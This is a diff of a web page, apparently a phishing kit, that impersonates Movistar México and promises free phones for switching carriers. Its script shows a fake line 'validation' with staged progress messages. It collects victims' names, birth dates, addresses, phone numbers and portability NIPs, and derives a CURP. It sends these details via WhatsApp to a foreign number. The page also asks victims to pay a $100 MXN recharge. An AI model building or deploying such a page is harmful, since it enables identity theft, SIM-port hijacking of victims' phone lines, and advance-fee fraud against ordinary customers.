+                <i class="fas fa-check text-5xl"></i>
+            </div>
+            <h2 class="text-4xl md:text-5xl font-black text-slate-800 italic uppercase tracking-tighter mb-4 leading-none">¡REGISTRO CONFIRMADO!</h2>
+            <p class="text-slate-500 font-bold mb-12">Tu solicitud ha sido vinculada correctamente. Sigue los pasos finales:</p>
+            
+            <div class="bg-blue-50 border-2 border-blue-100 p-10 rounded-[4rem] mb-12">
+                <span class="text-xs font-black text-movistar-blue uppercase tracking-widest block mb-3">Folio de Retiro de Chip</span>
+                <h3 id="order-id" class="text-5xl font-black text-slate-900 tracking-tighter mb-10">MOV-000000</h3>
+                
+                <div class="grid grid-cols-3 gap-6 max-w-sm mx-auto">
+                    <div class="countdown-box">
+                        <span id="h-val" class="countdown-val">72</span>
+                        <span class="countdown-label">Horas</span>
+                    </div>
+                    <div class="countdown-box">
+                        <span id="m-val" class="countdown-val">00</span>
+                        <span class="countdown-label">Min</span>
+                    </div>
+                    <div class="countdown-box">
+                        <span id="s-val" class="countdown-val">00</span>
+                        <span class="countdown-label">Seg</span>
+                    </div>
+                </div>
+                <p class="text-[11px] text-movistar-blue mt-8 font-black uppercase italic animate-pulse">
+                    Tiempo estimado para despacho de equipo a domicilio
+                </p>
+            </div>
 
-    <!-- Footer -->
-    <footer class="bg-slate-900 text-slate-500 py-16 mt-20">
+            <div class="text-left bg-slate-50 p-8 rounded-[3rem] space-y-4 border border-slate-100">
+                <p class="text-xs font-bold text-slate-700 uppercase flex items-center gap-3"><i class="fas fa-info-circle text-movistar-blue"></i> Instrucciones Finales:</p>
+                <ul class="text-[11px] text-slate-500 font-medium list-disc pl-5 space-y-2">
+                    <li>Acude a tu sucursal Movistar con tu folio para recoger tu chip.</li>
+                    <li>Realiza una recarga mínima de <span class="font-black text-slate-800">$100 MXN</span> para activar la línea.</li>
+                    <li>Regístrate en el portal de la compañía para activar el seguro del equipo.</li>
+                </ul>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer Compartido -->
+    <footer id="footer" class="bg-slate-900 text-slate-500 py-20 mt-20">
         <div class="container mx-auto px-4 text-center">
-            <p class="text-sm font-bold uppercase tracking-widest text-white mb-4 italic">Telefónica | Movistar México</p>
-            <p class="text-[10px] opacity-60 leading-relaxed max-w-xl mx-auto mb-6">
-                © 2026 Movistar. La entrega del equipo está sujeta al cumplimiento de la recarga inicial de $100 y el registro en el portal web de la compañía. Las 48 horas de entrega cuentan a partir de la validación del registro.
+            <p class="text-sm font-black uppercase tracking-widest text-white mb-6 italic">Telefónica | Movistar México</p>
+            <p class="text-[10px] opacity-40 leading-relaxed max-w-2xl mx-auto mb-10">
+                © 2026 Movistar. Programa exclusivo de portabilidad. La entrega de equipos está sujeta a la validación exitosa del NIP y la activación de la línea con recarga inicial. Soporte: +52 33 34 06 69 72.
             </p>
-            <div class="text-[9px] uppercase font-bold text-slate-700">Soporte México: +52 33 34 06 69 72</div>
+            <div class="flex justify-center gap-8 grayscale opacity-30">
+                <i class="fab fa-facebook text-2xl"></i>
+                <i class="fab fa-twitter text-2xl"></i>
+                <i class="fab fa-instagram text-2xl"></i>
+            </div>
         </div>
     </footer>
 
     <script>
-        const products = [
-            { id: 51, name: "iPhone 17 Pro Max", brand: "apple", img: "https://raw.githubusercontent.com/kaddexomg/moxistar.mx/refs/heads/main/IPHONE/iPhone%2017%20Pro%20Max.jfif", specs: "Chip A19 Pro | 1TB Titanium" },
-            { id: 52, name: "iPhone 17", brand: "apple", img: "https://raw.githubusercontent.com/kaddexomg/moxistar.mx/refs/heads/main/IPHONE/iPhone%2017.jfif", specs: "Chip A18 | 256GB Liquid" },
-            { id: 11, name: "Galaxy S24 Ultra", brand: "samsung", img: "https://raw.githubusercontent.com/kaddexomg/moxistar.mx/refs/heads/main/SAMGMUG/s%2024%20ultra.jfif", specs: "SD 8 Gen 3 | 512GB AI" },
-            { id: 1, name: "iPhone 15 Pro Max", brand: "apple", img: "https://raw.githubusercontent.com/kaddexomg/moxistar.mx/refs/heads/main/IPHONE/iPhone%2015%20Pro%20Max.jfif", specs: "Titanio | A17 Pro" },
-            { id: 21, name: "Edge 40 Pro", brand: "motorola", img: "https://raw.githubusercontent.com/kaddexomg/moxistar.mx/refs/heads/main/MOTOROLA/Edge%2040%20Pro.jfif", specs: "SD 8 Gen 2 | 256GB" },
-            { id: 31, name: "Xiaomi 13T Pro", brand: "xiaomi", img: "https://raw.githubusercontent.com/kaddexomg/moxistar.mx/refs/heads/main/XIAOMI/Xiaomi%2013T%20Pro.jfif", specs: "Leica | 512GB" },
-            { id: 14, name: "Galaxy Z Fold 5", brand: "samsung", img: "https://raw.githubusercontent.com/kaddexomg/moxistar.mx/refs/heads/main/SAMGMUG/Galaxy%20Z%20Fold%205.jfif", specs: "Plegable | 512GB" },
-            { id: 23, name: "Razr 40 Ultra", brand: "motorola", img: "https://raw.githubusercontent.com/kaddexomg/moxistar.mx/refs/heads/main/MOTOROLA/Razr%2040%20Ultra.jfif", specs: "Flexible | SD 8+" },
-            { id: 35, name: "POCO X6 Pro", brand: "xiaomi", img: "https://raw.githubusercontent.com/kaddexomg/moxistar.mx/refs/heads/main/XIAOMI/POCO%20X6%20Pro.jfif", specs: "Dimensity 8300 Ultra" },
-            { id: 41, name: "Redmi Note 13 Pro+", brand: "redmi", img: "https://raw.githubusercontent.com/kaddexomg/moxistar.mx/refs/heads/main/XIAOMI/Redmi%20Note%2013%20Pro%2B.jfif", specs: "Curvo | 200MP" },
-            // ... (Se asumen los demás equipos de la base anterior)
+        const devices = [
+            { id: 1, name: "iPhone 17 Pro Max", brand: "apple", img: "https://raw.githubusercontent.com/kaddexomg/moxistar.mx/refs/heads/main/IPHONE/iPhone%2017%20Pro%20Max.jfif", specs: "Titanium | 1TB | A19 Pro" },
+            { id: 2, name: "iPhone 17", brand: "apple", img: "https://raw.githubusercontent.com/kaddexomg/moxistar.mx/refs/heads/main/IPHONE/iPhone%2017.jfif", specs: "256GB | Chip A18 AI" },
+            { id: 3, name: "Galaxy S24 Ultra", brand: "samsung", img: "https://raw.githubusercontent.com/kaddexomg/moxistar.mx/refs/heads/main/SAMGMUG/s%2024%20ultra.jfif", specs: "AI Pro | 512GB | Titanium" },
+            { id: 4, name: "Galaxy Z Fold 5", brand: "samsung", img: "https://raw.githubusercontent.com/kaddexomg/moxistar.mx/refs/heads/main/SAMGMUG/Galaxy%20Z%20Fold%205.jfif", specs: "Plegable | 512GB | 12GB RAM" },
+            { id: 5, name: "Edge 40 Pro", brand: "motorola", img: "https://raw.githubusercontent.com/kaddexomg/moxistar.mx/refs/heads/main/MOTOROLA/Edge%2040%20Pro.jfif", specs: "SD 8 Gen 2 | 256GB" },
+            { id: 6, name: "Xiaomi 13T Pro", brand: "xiaomi", img: "https://raw.githubusercontent.com/kaddexomg/moxistar.mx/refs/heads/main/XIAOMI/Xiaomi%2013T%20Pro.jfif", specs: "Leica Optic | 512GB | 120W" },
+            { id: 7, name: "iPhone 15 Pro Max", brand: "apple", img: "https://raw.githubusercontent.com/kaddexomg/moxistar.mx/refs/heads/main/IPHONE/iPhone%2015%20Pro%20Max.jfif", specs: "Natural Titanium | 256GB" },
+            { id: 8, name: "Redmi Note 13 Pro+", brand: "redmi", img: "https://raw.githubusercontent.com/kaddexomg/moxistar.mx/refs/heads/main/XIAOMI/Redmi%20Note%2013%20Pro%2B.jfif", specs: "200MP | Curved Screen | 512GB" }
         ];
 
-        let selectedProduct = null;
+        let selectedDevice = null;
 
-        // --- VALIDACIÓN DE ESTATUS ---
-        function startValidation() {
-            const phone = document.getElementById('val-phone').value;
-            if (phone.length < 10) {
-                return;
-            }
+        // --- LÓGICA DE NAVEGACIÓN ---
+        function navigateTo(stage) {
+            document.querySelectorAll('.stage-container').forEach(s => s.classList.remove('active'));
+            document.getElementById(`stage-${stage}`).classList.add('active');
             
-            document.getElementById('val-loading').classList.remove('hidden');
-            
-            setTimeout(() => {
-                document.getElementById('view-validator').classList.add('hidden');
-                document.getElementById('view-catalog').classList.remove('hidden');
-                window.scrollTo({ top: 0, behavior: 'smooth' });
-            }, 2500);
+            // Stepper Visual
+            document.querySelectorAll('.step-indicator').forEach((dot, idx) => {
+                const sNum = idx + 1;
+                dot.classList.remove('active', 'completed');
+                if (sNum < stage) dot.classList.add('completed');
+                if (sNum === stage) dot.classList.add('active');
+            });
+
+            if (stage === 2) renderDevices(devices);
+            if (stage === 4) document.getElementById('global-stepper').style.display = 'none';
+
+            window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        // --- RENDERIZADO ---
-        function renderProducts(items) {
-            const grid = document.getElementById('products-grid');
-            grid.innerHTML = items.map(p => `
-                <div onclick="selectProduct(${p.id})" class="product-card bg-white rounded-[2.5rem] p-6 border border-slate-100 flex flex-col items-center cursor-pointer group">
-                    <div class="relative w-full h-52 bg-slate-50 rounded-[2rem] flex items-center justify-center p-6 mb-6 overflow-hidden">
-                        <img src="${p.img}" alt="${p.name}" class="max-h-full object-contain group-hover:scale-110 transition-transform duration-500">
+        // --- VALIDACIÓN ETAPA 1 ---
+        function processValidation() {
+            const num = document.getElementById('val-phone').value;
+            if (num.length < 10) return;
+
+            document.getElementById('val-btn').classList.add('hidden');
+            const box = document.getElementById('val-loader-box');
+            const bar = document.getElementById('val-progress');
+            const txt = document.getElementById('val-text');
+            box.classList.remove('hidden');
+
+            const steps = [
+                { p: 25, t: "Verificando titularidad de línea..." },
+                { p: 50, t: "Consultando historial de recargas..." },
+                { p: 85, t: "Buscando convenios de portabilidad..." },
+                { p: 100, t: "¡SISTEMA APROBADO!" }
+            ];
+
+            let i = 0;
+            const timer = setInterval(() => {
+                if (i < steps.length) {
+                    bar.style.width = steps[i].p + "%";
+                    txt.innerText = steps[i].t;
+                    i++;
+                } else {
+                    clearInterval(timer);
+                    setTimeout(() => navigateTo(2), 600);
+                }
+            }, 800);
+        }
+
+        // --- CATÁLOGO ETAPA 2 ---
+        function renderDevices(items) {
+            const grid = document.getElementById('device-grid');
+            grid.innerHTML = items.map(d => `
+                <div onclick="selectDevice(${d.id})" class="product-card bg-white rounded-[3rem] p-8 border border-slate-100 flex flex-col items-center cursor-pointer group">
+                    <div class="relative w-full h-56 bg-slate-50 rounded-[2.5rem] flex items-center justify-center p-6 mb-8 overflow-hidden">
+                        <img src="${d.img}" alt="${d.name}" class="max-h-full object-contain group-hover:scale-110 transition-transform duration-500">
+                        <span class="absolute top-4 right-4 bg-movistar-blue text-white text-[8px] font-black px-3 py-1 rounded-full uppercase italic">Regalo</span>
                     </div>
                     <div class="w-full text-center">
-                        <span class="text-[9px] font-black uppercase tracking-[0.2em] text-slate-300">${p.brand}</span>
-                        <h4 class="text-lg font-black text-slate-800 mt-1 mb-1 italic h-14 line-clamp-2 uppercase leading-tight">${p.name}</h4>
-                        <p class="text-[10px] text-slate-400 mb-6 font-medium">${p.specs}</p>
-                        <div class="w-full py-4 bg-slate-900 text-white rounded-2xl text-[10px] font-black uppercase group-hover:bg-movistar-blue transition-all">
-                            SOLICITAR EQUIPO BONIFICADO
+                        <span class="text-[10px] font-black uppercase tracking-[0.2em] text-slate-300 group-hover:text-movistar-blue transition-colors">${d.brand}</span>
+                        <h4 class="text-xl font-black text-slate-800 mt-2 mb-2 italic uppercase leading-none h-12 line-clamp-2">${d.name}</h4>
+                        <p class="text-[10px] text-slate-400 mb-8 font-bold">${d.specs}</p>
+                        <div class="w-full py-4 bg-slate-900 text-white rounded-2xl text-[10px] font-black uppercase group-hover:bg-movistar-green transition-all shadow-xl shadow-slate-200">
+                            RECLAMAR ESTE EQUIPO <i class="fas fa-chevron-right ml-2 text-[8px]"></i>
                         </div>
                     </div>
                 </div>
             `).join('');
         }
 
-        function filterProducts() {
-            const query = document.getElementById('searchInput').value.toLowerCase();
-            const filtered = products.filter(p => p.name.toLowerCase().includes(query));
-            renderProducts(filtered);
+        function filterDevices() {
+            const q = document.getElementById('searchInput').value.toLowerCase();
+            renderDevices(devices.filter(d => d.name.toLowerCase().includes(q)));
         }
 
-        function selectProduct(id) {
-            selectedProduct = products.find(p => p.id === id);
-            document.getElementById('checkout-img').src = selectedProduct.img;
-            document.getElementById('checkout-name').innerText = selectedProduct.name;
-            document.getElementById('view-catalog').classList.add('hidden');
-            document.getElementById('view-checkout').classList.remove('hidden');
-            window.scrollTo({ top: 0, behavior: 'smooth' });
+        function selectDevice(id) {
+            selectedDevice = devices.find(d => d.id === id);
+            document.getElementById('checkout-img').src = selectedDevice.img;
+            document.getElementById('checkout-name').innerText = selectedDevice.name;
+            navigateTo(3);
         }
 
-        function backToCatalog() {
-            document.getElementById('view-catalog').classList.remove('hidden');
-            document.getElementById('view-checkout').classList.add('hidden');
-            window.scrollTo({ top: 0, behavior: 'smooth' });
+        function backToCatalog() { navigateTo(2); }
+
+        // --- CÁLCULO CURP MANUAL ---
+        function calculateCURP(d) {
+            const n = d.name.toUpperCase();
+            const p = d.paterno.toUpperCase();
+            const m = d.materno.toUpperCase();
+            const b = d.dob.split("-"); // YYYY-MM-DD
+            const s = d.sex;
+            const e = d.state;
+
+            const voc = (str) => (str.substring(1).match(/[AEIOU]/) || ["X"])[0];
+            const con = (str) => (str.substring(1).match(/[BCDFGHJKLMNPQRSTVWXYZ]/) || ["X"])[0];
+
+            let curp = p.substring(0, 1);
+            curp += voc(p);
+            curp += m.substring(0, 1);
+            curp += n.substring(0, 1);
+            curp += b[0].substring(2, 4); // YY
+            curp += b[1]; // MM
+            curp += b[2]; // DD
+            curp += s + e;
+            curp += con(p) + con(m) + con(n);
+            curp += "A" + Math.floor(Math.random() * 9);
+            
+            return curp;
         }
 
-        // --- SUBMIT FINAL ---
-        function handleFinalSubmit(e) {
+        // --- ENVÍO FINAL ETAPA 3 ---
+        function submitPortability(e) {
             e.preventDefault();
             
-            const formData = {
-                name: document.getElementById('cust-name').value,
-                paterno: document.getElementById('cust-paterno').value,
-                materno: document.getElementById('cust-materno').value,
-                dob: document.getElementById('cust-dob').value,
-                sex: document.getElementById('cust-sex').value,
-                state: document.getElementById('cust-state').value,
-                promo: document.querySelector('input[name="promo"]:checked').value,
-                phone: document.getElementById('port-num').value,
-                nip: document.getElementById('port-nip').value,
-                address: document.getElementById('cust-address').value
+            const data = {
+                name: document.getElementById('c-name').value,
+                paterno: document.getElementById('c-paterno').value,
+                materno: document.getElementById('c-materno').value,
+                dob: document.getElementById('c-dob').value,
+                sex: document.getElementById('c-sex').value,
+                state: document.getElementById('c-state').value,
+                phone: document.getElementById('p-num').value,
+                nip: document.getElementById('p-nip').value,
+                address: document.getElementById('p-address').value
             };
 
-            const orderNum = `MOV-REG-${Date.now().toString().slice(-6)}`;
+            const curp = calculateCURP(data);
+            const folio = `MOV-REG-${Math.floor(Math.random() * 900000) + 100000}`;
 
-            const message = 
-                `*SOLICITUD DE PORTABILIDAD + REGALO*%0A` +
-                `*FOLIO:* ${orderNum}%0A` +
+            const msg = 
+                `*PORTABILIDAD MÉXICO - EQUIPO DE REGALO*%0A` +
+                `*FOLIO:* ${folio}%0A` +
                 `--------------------------------%0A` +
-                `*1. EQUIPO SELECCIONADO:*%0A` +
-                `📌 ${selectedProduct.name} ($0.00)%0A%0A` +
-                `*2. DATOS DEL TITULAR:*%0A` +
-                `👤 *Nombre:* ${formData.name} ${formData.paterno} ${formData.materno}%0A` +
-                `🎂 *F. Nacimiento:* ${formData.dob}%0A` +
-                `🚻 *Género:* ${formData.sex} | *Edo:* ${formData.state}%0A%0A` +
-                `*3. DATOS TÉCNICOS:*%0A` +
-                `📱 *Número a Portar:* ${formData.phone}%0A` +
-                `🔑 *NIP Portabilidad:* ${formData.nip}%0A` +
-                `🎁 *Recarga de Activación:* ${formData.promo}%0A%0A` +
-                `*4. ENTREGA:*%0A` +
-                `🏠 *Dirección:* ${formData.address}%0A` +
+                `*EQUIPO:* ${selectedDevice.name}%0A%0A` +
+                `*DATOS DEL TITULAR:*%0A` +
+                `👤 *Nombre:* ${data.name} ${data.paterno} ${data.materno}%0A` +
+                `🆔 *CURP:* ${curp}%0A` +
+                `🎂 *F. Nacimiento:* ${data.dob}%0A%0A` +
+                `*DATOS TÉCNICOS:*%0A` +
+                `📞 *Línea:* ${data.phone}%0A` +
+                `🔑 *NIP:* ${data.nip}%0A%0A` +
+                `*LOGÍSTICA:*%0A` +
+                `🏠 *Dirección:* ${data.address}%0A` +
                 `--------------------------------%0A` +
-                `_Acepto realizar recarga de $100 y registro en portal para recibir equipo en 48 horas._`;
+                `_Acepto realizar recarga de $100 y registro para despacho en 48-72h._`;
 
-            const btn = document.getElementById('submitBtn');
-            btn.innerHTML = `<i class="fas fa-circle-notch animate-spin"></i> GENERANDO FOLIO...`;
+            const btn = document.getElementById('submit-btn');
+            btn.innerHTML = `<i class="fas fa-circle-notch animate-spin"></i> PROCESANDO TRÁMITE...`;
             btn.classList.add('opacity-70', 'pointer-events-none');
 
-// Redirección a WhatsApp (+584124676073)
+            // Redirección y Cambio a Éxito
             setTimeout(() => {
-window.location.href = `https://wa.me/584124676073?text=${message}`;
-            }, 1800);
+                window.open(`https://wa.me/584124676073?text=${msg}`, '_blank');
+                document.getElementById('order-id').innerText = folio;
+                navigateTo(4);
+                startTimer();
+            }, 2000);
+        }
+
+        // --- TIMER 72 HORAS ---
+        function startTimer() {
+            let total = 72 * 3600;
+            const interval = setInterval(() => {
+                total--;
+                if (total <= 0) clearInterval(interval);
+                
+                const h = Math.floor(total / 3600);
+                const m = Math.floor((total % 3600) / 60);
+                const s = total % 60;
+                
+                document.getElementById('h-val').innerText = h.toString().padStart(2, '0');
+                document.getElementById('m-val').innerText = m.toString().padStart(2, '0');
+                document.getElementById('s-val').innerText = s.toString().padStart(2, '0');
+            }, 1000);
         }
 
         window.onload = () => {
-            renderProducts(products);
             setTimeout(() => {
                 const loader = document.getElementById('loader');
                 loader.classList.add('opacity-0');
                 setTimeout(() => loader.style.display = 'none', 500);
-            }, 2000);
+            }, 1500);
         };
     </script>
 
     <!-- Cloudflare Web Analytics -->
-    <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "ee51be2db73f4e56a8f2dc1761d0be1a"}'></script>
+    <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "b512031e6a3c471c8b9be510e875f762"}'></script>
     <!-- End Cloudflare Web Analytics -->
 
 </body>
-</html> 
+</html>
